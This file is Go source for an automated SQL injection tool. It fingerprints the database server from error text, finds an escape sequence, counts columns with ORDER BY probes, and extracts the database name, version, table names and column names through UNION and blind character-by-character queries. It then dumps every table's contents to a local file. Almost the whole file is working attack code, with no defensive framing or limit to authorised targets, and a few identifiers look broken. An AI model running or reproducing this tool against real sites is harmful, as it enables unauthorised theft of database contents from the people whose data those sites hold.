package main

import (
	"fmt"
	"strings"
	"net/url"
	"strconv"
	"regexp"
	"os"
	"log"
)

type SqlInjector struct {
	client *HttpClient
	forms []Form
	baseURL string
	serverName string
	comment string
	escape string
	db string
	dbVersion string
}

type Table struct {
	name string
	columns []string
	data []string
}


func (s *SqlInjector) setServerType(msg string) {
	error_message := strings.ToLower(msg)
	if strings.Contains(error_message, "microsoft") {
		s.comment = "--"
		s.serverName = "Microsoft SQL Server"
	} else if strings.Contains(error_message, "mariadb") {
		s.comment = "#"
		s.serverName = "MariaDB"
	} else if strings.Contains(error_message, "mysql") {
		s.comment = "#"
		s.serverName = "MySql"
	} else if strings.Contains(error_message, "postgresql") {
		s.comment = "--"
		s.serverName = "PostgreSQL"
	} else if strings.Contains(error_message, "sqlite") {
		s.comment = "--"
		s.serverName = "SQLite"
	} else if strings.Contains(error_message, "oracle") {
		s.comment = "--"
		s.serverName = "Oracle"
	} else {
		fmt.Println("Database server unknown. It might lead to inconsistent results.")
		s.comment = "--"
	}
}


func (s *SqlInjector) isInvalid_Syntax(rbody string) bool {
	rbody = strings.ToLower(rbody)
	return strings.Contains(rbody, "error") ||
	strings.Contains(rbody, "syntax") || 
	strings.Contains(rbody, "invalid") ||
	strings.Contains(rbody, "missing") ||
	strings.Contains(rbody, "unknown")
}

func (s *SqlInjector) generate_query(form *Form, cmd string) url.Values {
	escapedQuery := url.Values{}
	for _, attr := range form.queryValues {
		if strings.Contains(attr, "Submit") || strings.Contains(attr, "submit") {
			escapedQuery.Add(attr, attr)
		} else {
			escapedQuery.Add(attr, cmd)
		}
	}
	return escapedQuery
}



func (s *SqlInjector) GetSyntaxError() {
	for _, form := range s.forms {
		for cmd := range inital_checks {
			query := s.generate_query(&form, cmd)
			response := s.client.Get("?" + query.Encode())
			body, err := s.client.Response(response)
			if err != nil {
				continue
			}
			if s.isInvalid_Syntax(body) {
				s.setServerType(body)
				s.escape = inital_checks[cmd]
				break
			}
		}
	}
}

func (s *SqlInjector) GetColumnNumber() {
	var num string
	var cmd string

	for idx := range s.forms {
		form := &s.forms[idx]
		for i := 1; i <= 100; i++ {
			num = strconv.Itoa(i)
			cmd = fmt.Sprintf("1%s ORDER BY %s%s", s.escape, num, s.comment)
			query := s.generate_query(form, cmd)
			response := s.client.Get("?" + query.Encode())
			body, err := s.client.Response(response)
			if err != nil {
				continue
			}
			if s.isInvalid_Syntax(body) {
				form.colNum = i - 1
				break
			}
		}
	}
}

func (s *SqlInjector) GetDatabaseName() {
	matches := s.union_cmd("database()")
	dbname := s.getDatabaseName()
	for _, match := range matches {
		for _, str := range match {
			if strings.Contains(str, dbname) {
				s.db = dbname
			}
		}
	}
}


func (s *SqlInjector) GetDatabaseVersion() {
	matches := s.union_cmd("version()")
	dbversion := s.getDatabaseVersion()
	for _, match := range matches {
		for _, str := range match {
			if strings.Contains(str, dbversion) {
				s.dbVersion = dbversion
			}
		}
	}
}

func (s *SqlInjector) getDatabaseName() string {
	db_len := s.get_len("AND LENGTH(database())=")
	dbname := s.get_name("database()", db_len)
	return dbname                                                                                                 
}

func (s *SqlInjector) getDatabaseVersion() string {
	dbv_len := s.get_len("AND LENGTH(version())=") 
	dbversion := s.get_name("version()", dbv_len)
	return dbversion                                                                                                         
}

func (s *SqlInjector) GetDatabaseDump(filename string) {
	file, err := os.Create(filename)
	if err != nil {
		log.Fatal("Error creating file:", err)
	}
	defer file.Close()

	data := fmt.Sprintf("[DB SERVERNAME] %s\n[DB] %s\n[DB VERSION] %s\n", s.serverName, s.db, s.dbVersion)
	_, err = file.WriteString(data)
	if err != nil {
		log.Fatal("Error writing to file:", err)
	}
	
	tables := s.getTables()
	for _, table := range tables {
		data := fmt.Sprintf("[TABLENAME] %s\n[COLUMNS] %v\n[DATA]\n", table.name, table.columns)
		_, err = file.WriteString(data)
		if err != nil {
			log.Fatal("Error writing to file:", err)
		}

		for _, row := range table.data {
			rowData := fmt.Sprintf("%v\n", row)
			_, err = file.WriteString(rowData)
			if err != nil {
				log.Fatal("Error writing to file:", err)
			}
		}
	}
}

func (s *SqlInjector) getTables() []Table {
	var cmd string
	var len int
	var name string
	var colNames []string
	var tables []Table
	var dbData []string

	tableNum := s.get_len("AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=") 
	for i := 0; i < tableNum; i++ {
		cmd = fmt.Sprintf("AND LENGTH(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET %d),1))=", i)
		len = s.get_len(cmd)
		cmd = fmt.Sprintf("(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET %d)", i)
		name = s.get_name(cmd, len)
		cmd = fmt.Sprintf("AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name=\"%s\")=", name)
		len = s.get_len(cmd)
		colNames = s.getTableColumns(name, len)
		dbData = s.select_from_table(name, colNames)
		tableInfo := Table{name, colNames, dbData}
		tables = append(tables, tableInfo)
	}
	return tables
}


func (s *SqlInjector) getTableColumns(tableName string, colNum int) []string {
	var cmd string
	var len int
	var names []string

	for i := 0; i <= colNum; i++ {
		cmd = fmt.Sprintf("AND LENGTH(substr((SELECT column_name FROM information_schema.columns WHERE table_name=\"%s\" LIMIT 1 OFFSET %d),1))=", tableName, i)
		len = s.get_len(cmd)
		cmd = fmt.Sprintf("(SELECT column_name FROM information_schema.columns WHERE table_name=\"%s\" LIMIT 1 OFFSET %d)", tableName, i)
		names = append(names, s.get_name(cmd, len))
	}
	return names
}


func (s *SqlInjector) get_name(str string, strlen int) string {
	var name []rune

	re := regexp.MustCompile(`<pre>(.*?)</pre>`)
	for _, form := range s.forms {
		for i := 1; i <= strlen; i++ {
			for j := 32; j <= 126; j++ { 
				payload := fmt.Sprintf("1%s AND ascii(substr(%s, %d, 1))=%d%s", s.escape, str, i, j, s.comment)
				query := s.generate_query(&form, payload)
				response := s.client.Get("?" + query.Encode())
				body, err := s.client.Response(response)
				if err != nil {
					continue
				}
				if s.isInvalid_Syntax(body) {
					continue
				}
				matches := re.FindAllStringSubmatch(body, -1)
				if len(matches) > 0 {
					name = append(name, rune(j))
				}	
			}
		}
	}
	return string(name)
}

func (s *SqlInjector) union_cmd(arg string) [][]string {
	var union_cmd string
	re := regexp.MustCompile(`<pre>(.*?)</pre>`)
	for _, form := range s.forms {
		cmds := generate_database_command(form.colNum, arg)
		for _, cmd := range cmds {
			union_cmd = fmt.Sprintf("1%s UNION SELECT %s%s", s.escape, strings.Join(cmd, ","), s.comment)
			query := s.generate_query(&form, union_cmd)
			response := s.client.Get("?" + query.Encode())
			body, err := s.client.Response(response)
			if err != nil {
				continue
			}
			if s.isInvalid_Syntax(body) {
				break
			}
			matches := re.FindAllStringSubmatch(body, -1)
			return matches
		}
	}
	return nil
}

func (s *SqlInjector) get_len(cmd string) int {
	var custom_cmd string

	re := regexp.MustCompile(`<pre>(.*?)</pre>`)
	for _, form := range s.forms {
		for i := 1; i <= 100; i++ {
			num := strconv.Itoa(i)
			custom_cmd = fmt.Sprintf("1%s %s%s%s", s.escape, cmd, num, s.comment)
			query := s.generate_query(&form, custom_cmd)
			response := s.client.Get("?" + query.Encode())
			body, err := s.client.Response(response)
			if err != nil {
				continue
			}
			if s.isInvalid_Syntax(body) {
				break
			}
			matches := re.FindAllStringSubmatch(body, -1)
			for _, match := range matches {
				for _, str := range match {
					if strings.Contains(str, num) {
						return i
					}
				}
			}
		}
	}
	return 0
}

func (s *SqlInjector) select_from_table(tableName string, tableColumns []string) []string {
	var allMatches []string
	re := regexp.MustCompile(`<pre>(.*?)</pre>`)
	for _, form := range s.forms {
		cols := s.splitColumnsToFormCount(form.colNum, tableColumns)
		for _, col := range cols {
			custom_cmd := fmt.Sprintf("1%s UNION SELECT %s FROM %s%s", s.escape, col, tableName, s.comment)
			query := s.generate_query(&form, custom_cmd)
			response := s.client.Get("?" + query.Encode())
			body, err := s.client.Response(response)
			if err != nil {
					continue
			}
			if s.isInvalid_Syntax(body) {
				continue
			}
			matches := re.FindAllStringSubmatch(body, -1)
			for _, match := range matches {
				allMatches = append(allMatches, match[1])
			}
		}
	}
	return allMatches
}

func (s *SqlInjector) splitColumnsToFormCount(formColNum int, columns []string) []string {
	var splitColumns []string
	var columnSet string

	columnsToSelect := columns 
	for len(columnsToSelect) > 0 {
		for len(columnsToSelect) < formColNum {
			columnsToSelect = append(columnsToSelect, "NULL")
		}
		for i := 0; i < formColNum; i++ {
			if len(columnsToSelect[i]) > 0 {
				columnSet += columnsToSelect[i] + ","
				} else {
					columnSet += "NULL,"
				}
			}
		splitColumns = append(splitColumns, strings.TrimRight(columnSet, ","))
		columnsToSelect = columnsToSelect[formColNum:]
		columnSet = ""
	}
	return splitColumns
}